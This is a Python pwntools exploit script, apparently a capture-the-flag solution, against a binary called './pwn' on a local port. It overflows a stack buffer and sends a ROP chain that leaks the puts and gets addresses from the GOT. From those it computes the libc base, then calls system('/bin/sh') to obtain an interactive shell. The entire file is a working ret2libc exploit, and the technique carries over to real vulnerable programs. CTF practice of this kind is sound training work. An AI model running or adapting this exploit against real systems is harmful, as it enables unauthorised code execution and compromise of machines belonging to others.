#!/usr/bin/python
from pwn import *
from pwn import p64, u64

# context.log_level = 'debug'

HOST = '127.0.0.1'
PORT = 51337
fname = './pwn'

LOCAL = False
p = None

elf = context.binary = ELF(fname)
rop = ROP(elf)

if not LOCAL:
    p = remote(HOST, PORT)
    libc = ELF('./libc6_2.27-3ubuntu1.4_amd64.so')
else:
    p = process(elf.path)
    libc = ELF('/usr/lib/libc6.so.6')


rl = lambda : p.recvline()
sl = lambda x: p.sendline(x)

def flush(n=5):
    for _ in range(n):
        print(rl())

def pwn():
    flush()

    # ret gadget
    ret = rop.find_gadget(['ret'])[0]
    # main address
    main = elf.symbols["main"]
    # puts@plt
    puts = elf.plt["puts"]
    # pop rdi, ret gadget
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    # use pwn cyclic to find overflow amount
    junk = b'A' * 136

    # 1.) Leak puts() address address
    payload = junk 
    # pop rdi, ret gadget
    payload += p64(pop_rdi)
    # load the address of puts into rdi
    payload += p64(elf.got['puts'])
    # print address of puts
    payload += p64(puts)
    # leak gets as well
    payload += p64(ret)
    payload += p64(pop_rdi)
    payload += p64(elf.got['gets'])
    payload += p64(puts)
    # return to main
    payload += p64(main)

    sl(payload)

    # indentify libc from https://libc.blukat.me
    leaked_puts = u64(rl().strip().ljust(8, b"\x00"))
    leaked_gets = u64(rl().strip().ljust(8, b"\x00"))

    # calculate offets
    libc.address = leaked_gets - libc.symbols["gets"]

    log.info(f"Leaked puts@got: {hex(leaked_puts)}")
    log.info(f"Leaked gets@got: {hex(leaked_gets)}")
    log.info(f"Found libc base: {hex(libc.address)}")

    flush()

    payload = junk
    payload += p64(pop_rdi)
    # load the address of /bin/sh into rdi register after calculating the offsets
    payload += p64(next(libc.search(b'/bin/sh')))
    payload += p64(ret)
    # execute system() and get shell
    payload += p64(libc.symbols['system'])

    sl(payload)

    p.interactive()

if __name__ == "__main__":
    pwn()
